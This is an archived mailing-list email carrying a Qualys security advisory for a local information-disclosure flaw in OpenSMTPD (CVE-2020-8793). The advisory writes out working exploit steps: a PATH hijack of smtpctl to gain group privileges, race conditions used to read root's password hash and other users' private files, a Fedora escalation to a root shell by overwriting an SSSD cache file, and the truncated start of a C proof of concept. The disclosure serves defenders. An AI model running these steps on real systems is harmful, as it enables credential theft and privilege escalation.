X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["33517" "Monday" "24" "February" "2020" "10:33:55" "-0800" "Qualys Security Advisory" "qsa@qualys.com" nil "1042" nil "^Date:" nil nil "2" nil nil (number mark "        qsa@qualys.c Feb 24 1042/33517 " thread-indent "\"[oss-security] Local information disclosure in OpenSMTPD (CVE-2020-8793)\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Local information disclosure in OpenSMTPD (CVE-2020-8793)" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 3428 invoked by uid 550); 24 Feb 2020 17:43:59 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 3403 invoked from network); 24 Feb 2020 17:43:58 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qualys.com; h=date : from : to :
 subject : message-id : content-type : mime-version; s=qualyscom;
 bh=N3kD6oldEISlupkC18sifhqTw+VV3pP7WQO2OA/CwAE=;
 b=FZskvMuUdg5X+/8iXk7zDsxiYNQw9cG0KEmW0FDt2UA9jVVp5MxQgDZnlrrNVV+JF8Sm
 uE/Q21iQI5x/eOLgtibTGPWvoCpjGpRuWYmvgI8kZZGmHfK+Ybw2BI8U0XKJEblAV7yQ
 4E7Zal69NndNQW1HY7fJ3l/uNw26XbW39tAvf+x+FL+zu145XVfNGbSKr20G87RHALRG
 jIvUZLREULnyTcfaMXUtbmZRQO3Cztych3TjVBBnT6xeQhVLwqjeUkRV50HcNGCZEghl
 qp7EzbXIchwBhm2+xAjmoxEaTA6cFX7QZd1EpeYuvJm3AfPXmXRz35U2ftOb6eLTL4sw mQ== 
Authentication-Results: ppops.net;
	spf=pass smtp.mailfrom=qsa@qualys.com
ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
 b=FjNWrz/R7Bn55w50yu6kO++5aOQPAFi1bdknyMu6hCA1CMLjVzbW0R7Xuah0j60tNx/+ZJVUvtuMr8yTOt5SWy3jIdbvqAN+2n/fXEBRSf2un1v9gtHcaXF3sugfDA1wR/g0jcA/N3KLIzQ9MDjpMLQnKtM/MGHFLA0B+vSGZWGFTDgbyG/5k4OAOTqpSdX/XlKi02GX/zpiEH+JLvPRFUDnvZeNJfxhFCP1cvaGTQecSoDVWz/s8q0CK2J/n/0/O8G+8QcDIGunf4DdkWMVB14+Q+d5iExF+qRcxfBkhbtNxMk3fQiG/+PawzAiEeLjc+3PyWozpd0WWJSS4GmC2Q==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector9901;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=N3kD6oldEISlupkC18sifhqTw+VV3pP7WQO2OA/CwAE=;
 b=C/PgXLHuI0KgorCYghzl1enfojtebKzDm/mTDvh94U5tLKsW4WU3dm4XP/yjxm2FaYevcc61yldrPH4xEu1EecA+By1+CLUfNYkrHoLCO1ZC1vTJQ7sqs58G0ZK9nEk50dJpYDvgXqB8y3TAjfnD+Ntr2QH0QlDa1FxWrqlS1qGpijfRCzE8c+g135IZGgjoHc6h7ayHPnEQ59kuvtXZD6wWihqJzUWlJAee8rFDIqpe99zYq66EgBo/9vo8KQFoMRAYbP31HHSM/c8VBqNz8zQGQbrIlFdAO3/F22Ras95WZjBfwUPWMGPZCafNQbkp/TtqabAIkIUiZdg5u+IAVQ==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=qualys.com; dmarc=pass action=none header.from=qualys.com;
 dkim=pass header.d=qualys.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=qualys.onmicrosoft.com; s=selector2-qualys-onmicrosoft-com;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=N3kD6oldEISlupkC18sifhqTw+VV3pP7WQO2OA/CwAE=;
 b=JtKExdqYa01vmDRXqblMalo2JXT2ZB2byCxgUk0sXBd48LWqabZljigZ3meUzu2gT/4MCdZex0/JZi/TB9S8tf63FErLmt/dM7bfzbcOawQ9Wf1L8GucwdPUwxZM6ZLaWIdFKqYLqh3+1BbnFbITlNu9lY8/2BLQqM0cMNpC99c=
Message-ID: <20200224183355.GC17396@localhost.localdomain>
Content-Type: multipart/mixed; boundary="4Ckj6UjgE2iN1+kY"
Content-Disposition: inline
X-ClientProxiedBy: BYAPR02CA0011.namprd02.prod.outlook.com
 (2603:10b6:a02:ee::24) To DM6PR06MB4090.namprd06.prod.outlook.com
 (2603:10b6:5:89::22)
MIME-Version: 1.0
X-MS-Exchange-MessageSentRepresentingType: 1
X-Originating-IP: [165.193.18.162]
X-MS-PublicTrafficType: Email
X-MS-Office365-Filtering-Correlation-Id: 3e989644-a89d-40f9-9feb-08d7b95117a1
X-MS-TrafficTypeDiagnostic: DM6PR06MB5467:
X-Microsoft-Antispam-PRVS: 
	<DM6PR06MB546742EE9ACED5ED173D77CED5EC0@DM6PR06MB5467.namprd06.prod.outlook.com>
X-MS-Oob-TLC-OOBClassifiers: OLM:2887;
X-Forefront-PRVS: 032334F434
X-Forefront-Antispam-Report: 
	SFV:NSPM;SFS:(10019020)(4636009)(136003)(39860400002)(346002)(376002)(366004)(396003)(189003)(199004)(44144004)(33964004)(52116002)(30864003)(7696005)(6506007)(81156014)(81166006)(8936002)(86362001)(66946007)(5660300002)(66476007)(1076003)(6666004)(235185007)(69590400006)(66616009)(66556008)(316002)(55016002)(33656002)(2906002)(9686003)(26005)(186003)(16526019)(6916009)(956004)(478600001)(8676002)(131040200001)(2700100001);DIR:OUT;SFP:1102;SCL:1;SRVR:DM6PR06MB5467;H:DM6PR06MB4090.namprd06.prod.outlook.com;FPR:;SPF:None;LANG:en;PTR:InfoNoRecords;MX:1;A:1;
Received-SPF: None (protection.outlook.com: qualys.com does not designate
 permitted sender hosts)
X-MS-Exchange-SenderADCheck: 1
X-Microsoft-Antispam: BCL:0;
X-Microsoft-Antispam-Message-Info: 
	Bjqh4AQFhEO2uWsUNWlYOlcT/AS9MG7iEbvT9CSI4+MR4kmqMFhHeS1xD9rgzmvG5XyJBJHSNB5GxoCIBYO/Fay/t3DDCVial+0ubYyL08O9S0yD3G6vI9P2wRT/4dCNtyUHbJov/Xhl/+fhZE5jLxQ1b9Q2x3lVmPhxSf/nSy7YEH6dJCCzgXrTJWQBQrFPyxicDmf3Prc41/MmzTNlD2sCK4w8DAEanQHjFO3lqgIOVxRGik074Vq34poxzhZHaG0DNRX4GZYOkegD7SOamHM0tSwiLEXcXqDt0DOuvJzY2kZ7wSPEHVHCM1DVh00w9E5nAAvlqW2d4BgUFWVuNucyE1RyxlNKr1smls454GQv8Ty8SGg+0ElFUFE8UKoxOFDMxhXbdlsxRuccSK+QKfna2Wq1tuN6aI65WTHW+c2QideNsEksz2D6D0DJIF7Nqd1ZWhR4awP80ETvydtqYcFRVLLD7MTBjI4GpTfN77keIGAGIa9FT5PRhz1xNroXD8MzZmeNjmMCXsb08uO5MJtZ0L7OJy3RMeL5CRj91WXyTU7hE5QbitJDlkqBZprfpYyq0xFK66TQssAGvd4z2ldQtL/fxKRPayMobEoPvgdbGqvCGXhtOxAVV9leXpyv+zoS/dfWe63lJm/gAkDGHPGvx7iJNI59kegnH8wmf4+DEQDRRGvMfa0zDFw3VUcI
X-MS-Exchange-AntiSpam-MessageData: 
	Bxg4FkkkaJyE/0TTSkQcqXzqk1rBJFYsTCWdGd7J5L2P+lhuNswQZJ6eUg5Vhb4QI09aykHMdkRiLs2q1h1OWsA1CB2/zcqvssHEJcCY06NfE7zZ+33ciVd/21hrRWw48c0O+D3usJAfsrSfZlNeFQ==
X-OriginatorOrg: qualys.com
X-MS-Exchange-CrossTenant-Network-Message-Id: 3e989644-a89d-40f9-9feb-08d7b95117a1
X-MS-Exchange-CrossTenant-OriginalArrivalTime: 24 Feb 2020 17:43:44.1609
 (UTC)
X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
X-MS-Exchange-CrossTenant-Id: 81a9ef9a-9a98-4b00-886a-895a603bc029
X-MS-Exchange-CrossTenant-MailboxType: HOSTED
X-MS-Exchange-CrossTenant-UserPrincipalName: yLXFE3ZBDSnQCSkHObaRISM/IvkqVoM+deg4DRLSZm/+RpOkSkGKGrdogzTOVNtj4qomUoHfeRqvaAbsVj6Ch2N1u7i1IUodHTXwDgViGh0=
X-MS-Exchange-Transport-CrossTenantHeadersStamped: DM6PR06MB5467
X-Proofpoint-SPF-Result: pass
X-Proofpoint-SPF-Record: v=spf1 include:_spf.qualys.com include:spf.protection.outlook.com
 include:spf-001ca501.pphosted.com include:stspg-customer.com
 include:spf.salesforce.com include:sendgrid.net include:mktomail.com ~all
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10434:6.0.138,18.0.572
 definitions=2020-02-24_07:2020-02-21,2020-02-24 signatures=0
Date: Mon, 24 Feb 2020 10:33:55 -0800
From: Qualys Security Advisory <qsa@qualys.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Local information disclosure in OpenSMTPD (CVE-2020-8793)
To: oss-security@lists.openwall.com

--4Ckj6UjgE2iN1+kY
Content-Type: text/plain; charset="utf-8"
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable


Qualys Security Advisory

Local information disclosure in OpenSMTPD (CVE-2020-8793)


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D
Contents
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D

Summary
Analysis
Exploitation
POKE 47196, 201
Acknowledgments


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D
Summary
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D

We discovered a minor vulnerability in OpenSMTPD, OpenBSD's mail server:
an unprivileged local attacker can read the first line of an arbitrary
file (for example, root's password hash in /etc/master.passwd) or the
entire contents of another user's file (if this file and
/var/spool/smtpd/ are on the same filesystem).

We developed a proof of concept and successfully tested it against
OpenBSD 6.6 (the current release). This vulnerability is generally not
exploitable on Linux, because /proc/sys/fs/protected_hardlinks is 1 by
default on most distributions. Surprisingly, however, it is exploitable
on Fedora (31) and yields full root privileges.


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D
Analysis
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D

In October 2015 we published the results of an exhaustive OpenSMTPD
audit (https://www.qualys.com/2015/10/02/opensmtpd-audit-report.txt);
one of our key findings was:

---------------------------------------------------------------------------=
---
Multiple hardlink attacks in the offline directory
...

In the world-writable "/var/spool/smtpd/offline" directory, local users
can create hardlinks to files they do not own, and wait until the server
reboots (or, crash OpenSMTPD with a denial-of-service and wait until the
administrator restarts it) to carry out assorted attacks.
...

2/ The following code in offline_enqueue() allows an attacker to
execvp() "/usr/sbin/smtpctl" as "sendmail", with a command-line argument
that is the hardlinked file's first line (CVE-2015-ABCD):
...

For example, an attacker can hardlink /etc/master.passwd to the offline
directory, and retrieve its first line (root's encrypted password) by
running ps (or a small program that simply calls sysctl() with
KERN_FILE_BYUID and KERN_PROC_ARGV) in a loop:
...

4/ If an attacker is able to reach another user's file (i.e., +x on all
directories that lead to the file) but not read it, he can hardlink the
file to the offline directory, and wait for savedeadletter() to create a
world-readable copy of the file in this other user's home directory:
---------------------------------------------------------------------------=
---

OpenBSD's patch for this vulnerability was threefold:

a/ They removed the world-writable and sticky bits from
/var/spool/smtpd/offline, changed its group to "_smtpq", and made
/usr/sbin/smtpctl set-group-ID _smtpq:

---------------------------------------------------------------------------=
---
drwxrwx---  2 root  _smtpq     512 Oct 12 10:34 /var/spool/smtpd/offline
-r-xr-sr-x  1 root  _smtpq  217736 Oct 12 10:34 /usr/sbin/smtpctl
---------------------------------------------------------------------------=
---

b/ They added an _smtpq group check to offline_scan():

---------------------------------------------------------------------------=
---
1543                 /* offline file group must match parent directory grou=
p */
1544                 if (e->fts_statp->st_gid !=3D e->fts_parent->fts_statp=
->st_gid)
1545                         continue;
....
1553                 if (offline_add(e->fts_name)) {
1554                         log_warnx("warn: smtpd: "
1555                             "could not add offline message %s", e->fts=
_name);
1556                         continue;
1557                 }
---------------------------------------------------------------------------=
---

This check (at line 1544) effectively prevents offline_scan() from
adding the filename of a hardlink to the offline queue (at line 1553),
because no interesting file on the filesystem belongs to the group
_smtpq.

c/ They added a hardlink check to offline_enqueue() (at line 1631),
which is called by offline_add():

---------------------------------------------------------------------------=
---
1615                 if ((fd =3D open(path, O_RDONLY|O_NOFOLLOW|O_NONBLOCK)=
) =3D=3D -1) {
1616                         log_warn("warn: smtpd: open: %s", path);
1617                         _exit(1);
1618                 }
1619
1620                 if (fstat(fd, &sb) =3D=3D -1) {
1621                         log_warn("warn: smtpd: fstat: %s", path);
1622                         _exit(1);
1623                 }
....
1631                 if (sb.st_nlink !=3D 1) {
1632                         log_warnx("warn: smtpd: file %s is hard-link",=
 path);
1633                         _exit(1);
1634                 }
---------------------------------------------------------------------------=
---

Unfortunately, a/ is vulnerable to a Local Privilege Escalation (into
the group _smtpq), and b/ and c/ are vulnerable to TOCTOU (time-of-check
to time-of-use) race conditions. As a result, a local attacker can still
carry out the hardlink attacks 2/ (master.passwd) and 4/ (dead.letter)
described in our 2015 audit report.


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D
Exploitation
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D

a/ If we execute /usr/sbin/smtpctl as "sendmail" or "send-mail", and
specify a "-bi" command-line argument, then smtpctl calls execlp()
without dropping its privileges:

---------------------------------------------------------------------------=
---
147         /* sendmail-compat makemap ... re-execute using proper interfac=
e */
148         if (argc =3D=3D 2) {
...
164                 execlp("makemap", "makemap", "-d", argv[0], "-o", dbnam=
e, "-",
165                     (char *)NULL);
166                 err(1, "execlp");
167         }
---------------------------------------------------------------------------=
---

We can exploit this execlp() call by specifying our own PATH environment
variable, and obtain the privileges of the group _smtpq:

---------------------------------------------------------------------------=
---
$ id
uid=3D1001(john) gid=3D1001(john) groups=3D1001(john)

$ ln -s /usr/sbin/smtpctl "send-mail"

$ cat > makemap << "EOF"
#!/bin/ksh
echo "$@"
exec /usr/bin/env -i /bin/ksh
EOF

$ chmod 0755 makemap

$ env -i PATH=3D. ./send-mail -- -bi dbname
-d -bi -o dbname.db -

$ id
uid=3D1001(john) gid=3D1001(john) egid=3D103(_smtpq) groups=3D1001(john)
---------------------------------------------------------------------------=
---

b/ The _smtpq group check is made only once in offline_scan(), but not
again in offline_enqueue() (which actually open()s the offline files).
Moreover, at most five offline files are processed concurrently; the
remaining files are simply added to the offline queue for later
processing. We can reliably win this first race condition:

- we create several large but sparse files (1GB each) in the offline
  directory (these files naturally pass the _smtpq group check);

- we SIGSTOP five of the offline_enqueue() processes that open() and
  slowly read() our large files;

- we wait until offline_scan() adds all of our remaining files to the
  offline queue;

- we replace these files with hardlinks to an interesting target file
  (for example, /etc/master.passwd);

- we SIGKILL the five stopped offline_enqueue() processes.

Finally, our hardlinks are processed by offline_enqueue(), and the
_smtpq group check is defeated.

c/ To defeat the hardlink check in offline_enqueue(), we create our
hardlink before the open() call at line 1615 (this increases st_nlink to
2), and delete it before the fstat() call at line 1620 (this decreases
st_nlink back to 1). In practice, we win this tight race condition after
just a few tries: our proof of concept fork()s a dedicated process that
simply calls link() and unlink() in a loop.

Moreover, if our target file is /etc/master.passwd, we can defeat the
hardlink check without a race: we hardlink /etc/master.passwd into the
offline directory (this increases st_nlink to 2), we run /usr/bin/passwd
or /usr/bin/chpass to generate a new /etc/master.passwd (this decreases
st_nlink back to 1), and finally we SIGKILL the five stopped
offline_enqueue() processes.

---------------------------------------------------------------------------=
---

For example, to read the first line of /etc/master.passwd (root's
password hash) with our proof of concept:

- First, on the attacker's terminal:

$ id
uid=3D1001(john) gid=3D1001(john) egid=3D103(_smtpq) groups=3D1001(john)

$ ./proof-of-concept 20
...
ready

- Next, on the administrator's terminal:

# rcctl restart smtpd
smtpd(ok)
smtpd(ok)

- Last, on the attacker's terminal:

...
root:$2b$10$xufPzZW36O2h2QmasLsjve8RyRQm0gu3mVX6IHE2nAYYD0Iw0gAnO:0:0:daemo=
n:0:0:Charlie &:/root:/bin/ksh

---------------------------------------------------------------------------=
---

To read the entire contents of another user's file (for example,
/home/admin/deep.secret) with our proof of concept:

- First, on the attacker's terminal:

$ id
uid=3D1001(john) gid=3D1001(john) egid=3D103(_smtpq) groups=3D1001(john)

$ ls -l /home/admin/deep.secret
----------  1 admin  admin  125 Feb 15 00:52 /home/admin/deep.secret

$ cat /home/admin/deep.secret
cat: /home/admin/deep.secret: Permission denied

$ ./proof-of-concept 100 /home/admin/deep.secret
...
ready

- Next, on the administrator's terminal:

# rcctl restart smtpd
smtpd(ok)
smtpd(ok)

- Last, on the attacker's terminal:

...
This is the contents of the deep.secret file.  Only root may see this file.
-rw-r--r--  1 admin  admin  132 Feb 15 01:21 /home/admin/dead.letter

$ cat /home/admin/dead.letter
From: admin <admin@obsd66.my.domain>
Date: Sat, 15 Feb 2020 01:21:03 -0700 (MST)

secret 2
secret 3
end of secret file deep.secret


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D
POKE 47196, 201
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D

On Linux, this vulnerability is generally not exploitable because
/proc/sys/fs/protected_hardlinks prevents attackers from creating
hardlinks to files they do not own. On Fedora 31, however, smtpctl is
set-group-ID root, not set-group-ID smtpq:

---------------------------------------------------------------------------=
---
-r-xr-sr-x. 1 root root 303368 Jul 26  2019 /usr/sbin/smtpctl
---------------------------------------------------------------------------=
---

Surprisingly, we were able to exploit this mistake and obtain full root
privileges:

- First, we exploited the Local Privilege Escalation in smtpctl to
  obtain the privileges of the group root:

---------------------------------------------------------------------------=
---
$ id
uid=3D1001(john) gid=3D1001(john) groups=3D1001(john) context=3D...

$ ln -s /usr/sbin/smtpctl "send-mail"

$ cat > makemap << "EOF"
#!/bin/bash -p
echo "$@"
exec /usr/bin/env -i /bin/bash -p
EOF

$ chmod 0755 makemap

$ env -i PATH=3D. ./send-mail -- -bi dbname
-d -bi -o dbname.db -

$ id
uid=3D1001(john) gid=3D1001(john) egid=3D0(root) groups=3D0(root),1001(john=
) context=3D...
---------------------------------------------------------------------------=
---

- Next, we searched for files that belong to the group root, are
  group-writable, but not world-writable:

---------------------------------------------------------------------------=
---
$ find / -group root -perm -020 '!' -perm -02 -ls
  ...
  4811008      0 drwxrwxr-x   2  root     root           51 Feb 15 17:49 /v=
ar/lib/sss/mc
  4811064   8212 -rw-rw-r--   1  root     root      8406312 Feb 15 18:58 /v=
ar/lib/sss/mc/passwd
  4810978   6260 -rw-rw-r--   1  root     root      6406312 Feb 15 18:58 /v=
ar/lib/sss/mc/group
  ...
---------------------------------------------------------------------------=
---

- Intrigued ("sss" stands for "System Security Services"), we dumped the
  contents of /var/lib/sss/mc/passwd:

---------------------------------------------------------------------------=
---
$ hexdump -C /var/lib/sss/mc/passwd
...
00000060  10 00 00 00 e9 03 00 00  e9 03 00 00 1d 00 00 00  |..............=
..|
00000070  6a 6f 68 6e 00 78 00 00  2f 68 6f 6d 65 2f 6a 6f  |john.x../home/=
jo|
00000080  68 6e 00 2f 62 69 6e 2f  62 61 73 68 00 ff ff ff  |hn./bin/bash..=
..|
...
---------------------------------------------------------------------------=
---

- Feeling adventurous, we overwrote "e9 03 00 00" (1001, our user-ID)
  with zeros (root's user-ID):

---------------------------------------------------------------------------=
---
$ dd if=3D/dev/zero of=3D/var/lib/sss/mc/passwd bs=3D1 seek=3D$((0x64)) cou=
nt=3D4 conv=3Dnotrunc
4+0 records in
4+0 records out
---------------------------------------------------------------------------=
---

- Last, we executed su to re-authenticate as ourselves (as user john),
  but obtained a root shell instead:

---------------------------------------------------------------------------=
---
$ su -l john
Password:

# id
uid=3D0(root) gid=3D1001(john) groups=3D1001(john) context=3D...
---------------------------------------------------------------------------=
---

Last-minute note: on February 9, 2020, opensmtpd-6.6.2p1-1.fc31 was
released and correctly made smtpctl set-group-ID smtpq, instead of
set-group-ID root.


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D
Acknowledgments
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D

We thank OpenBSD's developers, Todd Miller in particular, for their
quick response and patches. We also thank Solar Designer and MITRE's CVE
Assignment Team.



[https://d1dejaj6dcqv24.cloudfront.net/asset/image/email-banner-384-2x.png]=
<https://www.qualys.com/email-banner>



This message may contain confidential and privileged information. If it has=
 been sent to you in error, please reply to advise the sender of the error =
and then immediately delete it. If you are not the intended recipient, do n=
ot read, copy, disclose or otherwise use this message. The sender disclaims=
 any liability for such unauthorized use. NOTE that all incoming emails sen=
t to Qualys email accounts will be archived and may be scanned by us and/or=
 by external service providers to detect and prevent threats to our systems=
, investigate illegal or inappropriate behavior, and/or eliminate unsolicit=
ed promotional emails (=E2=80=9Cspam=E2=80=9D). If you have any concerns ab=
out this process, please contact us.

--4Ckj6UjgE2iN1+kY
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="proof-of-concept.c"

/*
 * Local information disclosure in OpenSMTPD (CVE-2020-8793)
 * Copyright (C) 2020 Qualys, Inc.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#include <sys/types.h>
#include <sys/param.h>
#include <sys/stat.h>
#include <sys/sysctl.h>
#include <sys/wait.h>
#include <errno.h>
#include <fcntl.h>
#include <fts.h>
#include <limits.h>
#include <pwd.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define P_SUSPSIG       0x08000000      /* Stopped from signal. */

#define PATH_SPOOL              "/var/spool/smtpd"
#define PATH_OFFLINE            "/offline"
#define OFFLINE_QUEUEMAX        5

#define die() do { \
    printf("died in %s: %u\n", __func__, __LINE__); \
    exit(EXIT_FAILURE); \
} while (0)

static const char * const *
create_files(const size_t n_files)
{
    size_t f;
    for (f = 0; f < n_files; f++) {
        char file[] = PATH_SPOOL PATH_OFFLINE "/0.XXXXXXXXXX";
        const int fd = mkstemp(file);
        if (fd <= -1) die();

        if (file[sizeof(file)-1] != '\0') die();
        file[sizeof(file)-1] = '\n';
        if (write(fd, file, sizeof(file)) != (ssize_t)sizeof(file)) die();
        if (close(fd) != 0) die();
    }

    const char ** const files = calloc(n_files, sizeof(char *));
    if (files == NULL) die();

    char * const paths[] = { PATH_SPOOL PATH_OFFLINE, NULL };
    FTS * const fts = fts_open(paths, FTS_PHYSICAL | FTS_NOCHDIR, NULL);
    if (fts == NULL) die();

    for (f = 0; ; ) {
        const FTSENT * const ent = fts_read(fts);
        if (ent == NULL) break;
        if (ent->fts_name[0] != '0') continue;
        if (ent->fts_name[1] != '.') continue;

        if (ent->fts_info != FTS_F) die();
        if (ent->fts_level != 1) die();
        if (ent->fts_statp->st_gid != ent->fts_parent->fts_statp->st_gid) die();
        if (ent->fts_statp->st_size <= 0) die();

        const char * const file = strdup(ent->fts_path);
        if (file == NULL) die();
        if (f >= n_files) die();
        files[f++] = file;
    }
    if (f != n_files) die();
    if (fts_close(fts) != 0) die();

    if (truncate(files[n_files - 1], 0) != 0) die();
    return files;
}

static void
wait_sentinel(const char * const * const files, const size_t n_files)
{
    for (;;) {
        struct stat sb;
        if (lstat(files[n_files - 1], &sb) != 0) {
            if (errno != ENOENT) die();
            return;
        }
        if (!S_ISREG(sb.st_mode)) die();
        if (sb.st_size != 0) die();
    }
    die();
}

static void
kill_wait(const pid_t pid)
{
    if (kill(pid, SIGKILL) != 0) die();

    int status = 0;
    if (waitpid(pid, &status, 0) != pid) die();
    if (!WIFSIGNALED(status)) die();
    if (WTERMSIG(status) != SIGKILL) die();
}

typedef struct {
    int stop;
    pid_t pid;
    int fd;
} t_stopper;

static t_stopper
fork_stopper(const uid_t uid)
{
    const int stop = (uid == getuid());

    int fds[2];
